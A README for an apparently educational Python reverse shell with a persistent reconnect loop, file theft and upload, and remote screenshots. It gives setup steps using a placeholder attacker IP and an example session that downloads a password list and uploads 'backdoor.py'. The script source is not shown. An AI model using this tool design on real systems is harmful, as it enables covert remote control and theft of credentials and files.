# 🚀 Advanced Python Reverse Shell

This **advanced reverse shell** is a robust upgrade over the basic version — designed for **realistic red teaming**, **persistent control**, and **hands-on ethical hacking practice**.

Built entirely in Python, it supports reliable reconnections, file transfers, screenshot capture, and cleaner command handling — all while maintaining code clarity and modularity for learning.

> ⚠️ For authorized educational use only. Do not run this on unauthorized systems or networks.

---

## 🆚 Basic vs Advanced: What's New?

| Feature                        | Basic Version                    | Advanced Version                                                       |
|-------------------------------|----------------------------------|------------------------------------------------------------------------|
| Persistent Reconnect          | ❌ Single attempt                 | ✅ Retries every 5 seconds if listener offline                         |
| File Download                 | ❌ Not supported                  | ✅ Substring match, filename confirmation, binary download             |
| File Upload                   | ❌ Not supported                  | ✅ Supports 0-byte and error handling                                  |
| Screenshot Capture            | ❌ Not supported                  | ✅ Remote capture + auto-delete + timestamped filename                 |
| Directory Navigation (`cd`)   | ✅ Supported                      | ✅ Echo current directory, cross-platform                              |
| Output Encoding               | ⚠️ Limited                       | ✅ CP437/UTF-8 auto-fallback, safe decode                              |
| No Output Feedback            | ❌ No feedback                    | ✅ "Command executed successfully" response                            |
| Graceful Exit (`stop`)        | ✅ Supported                      | ✅ Closes both scripts cleanly                                         |
| Socket Reuse (`SO_REUSEADDR`) | ❌ No                            | ✅ Prevents "port in use" errors                                       |

---

## 📁 Folder Structure

```

Advanced-Version/
├── README.md             # Tool documentation
├── advanced_hacker.py    # Listener with command + file support
└── advanced_victim.py    # Victim payload with persistent reconnect

````

---

## ✨ Features Overview

- 🔁 **Persistent Reconnect**  
- 💻 **Remote Command Execution**  
- 📂 **Directory Navigation (`cd`)**  
- 📥 **File Download** (auto-listing for name prefixes)  
- 📤 **File Upload** (with 0-byte detection)  
- 🖼️ **Screenshot Capture + Auto-Download**  
- 🛑 **Graceful Session Termination**  
- 📡 **Port Reuse with `SO_REUSEADDR`**  
- ⚙️ **File Protocol with 8-byte headers**  
- 🔐 **Cross-platform Encoding Handling**

---

## 🚀 Usage

### 🔧 Step 1: Configure IP & Port

In both `advanced_hacker.py` and `advanced_victim.py`:

```python
hacker_ip = "YOUR_ATTACKER_IP"
hacker_port = 10000
````

> Use `ipconfig` (Windows) or `ip a` (Linux) to find your IP address

---

### 🧠 Step 2: Start Listener (Attacker)

```bash
python3 advanced_hacker.py
```

### 👾 Step 3: Run Victim

On the victim machine:

```bash
python3 advanced_victim.py
```

Victim retries connection every 5 seconds.

---

## 💬 Command Reference

| Command             | Description                                                  |                                                        |
| ------------------- | ------------------------------------------------------------ | ------------------------------------------------------ |
| `cd`, `cd <path>`   | Navigate directories or show current directory               |                                                        |
| \`download \<prefix | name>\`                                                      | List matches if partial; exact match triggers download |
| `upload <filename>` | Upload file to victim from attacker machine                  |                                                        |
| `screenshot`        | Remote screen capture (PNG auto-saved & deleted from victim) |                                                        |
| `stop`              | Clean shutdown of both scripts                               |                                                        |
| Any shell command   | Executed and output is returned                              |                                                        |

---

## 📌 Example Session

```bash
> cd Desktop
Changed directory to Desktop

> download pass_
All files with (pass_) name!
  [+] pass_list.docx
  [+] pass_info.txt

> download pass_list.docx
Receiving file (38290 bytes)...
pass_list.docx downloaded successfully!

> upload backdoor.py
backdoor.py uploaded successfully!

> screenshot
Screenshot saved as screenshot-2025-06-03_08-00-00.png
File also removed from victim!

> stop
[*] Session terminated. Exiting.
```

---

## 🔬 Technical Insights

* 🔄 **Persistent loop**: Victim reconnects forever until success
* 🧠 **Command parser**: Smart logic for `cd`, `download`, `upload`, `stop`, and fallback shell
* 📦 **File transfer**: 8-byte file size header + binary chunks
* ✍️ **Encoding**: `cp437` (Windows) / `utf-8` (Linux), with fallback

---

## 🔐 Legal & Ethical Disclaimer

This software is provided for **educational and authorized cybersecurity practice only**.
Running it on systems or networks you do not **own or have explicit written permission to test** is illegal.

> The author assumes **no liability** for any misuse or damage caused.

---

## 🔗 Navigation

- ⬅️ [Back to Reverse Shell Overview](../README.md)
- ⬅️ [Back to All Tools](../../../README.md)
- 🔹 [Go to Basic Version](../Basic-Version/README.md)

---

## 👨‍💻 Author

**Muhammad Rehan Rashid**
🧠 GitHub Alias: [`C0de-N1nja`](https://github.com/C0de-N1nja)